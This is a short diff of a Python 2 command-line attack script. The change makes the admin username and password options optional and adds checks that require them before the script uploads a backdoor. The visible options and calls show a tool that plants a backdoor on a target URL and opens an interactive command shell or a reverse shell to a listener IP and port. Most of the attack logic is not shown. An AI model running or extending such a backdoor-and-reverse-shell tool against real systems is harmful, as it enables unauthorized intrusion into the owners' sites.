@@ -138,8 +138,8 @@ def main():
     parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
     parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
     parser.add_argument('-t','--target',help='URL of target', required=True)
-    parser.add_argument('-u','--username',help='Admin username', required=True)
-    parser.add_argument('-p','--password',help='Admin password', required=True)
+    parser.add_argument('-u','--username',help='Admin username', required=False)
+    parser.add_argument('-p','--password',help='Admin password', required=False)
     parser.add_argument('-li','--ip',help='Listener IP', required=False)
     parser.add_argument('-lp','--port',help='Listener Port', required=False)
     parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
@@ -149,6 +149,9 @@ def main():
     argcheck(args.interactive,args.reverse,args.target)
     if args.interactive:
         if args.existing is None:
+            if args.username is None or args.password is None:
+                print "Username and Password are required"
+                sys.exit()
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose)
         else:
             uploaddir = args.existing
@@ -159,6 +162,9 @@ def main():
             print "For a reverse shell, a listening IP and Port are required"
             sys.exit()
         if args.existing is None:
+            if args.username is None or args.password is None:
+                print "Username and Password are required"
+                sys.exit()
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose)
         else:
             uploaddir = args.existing
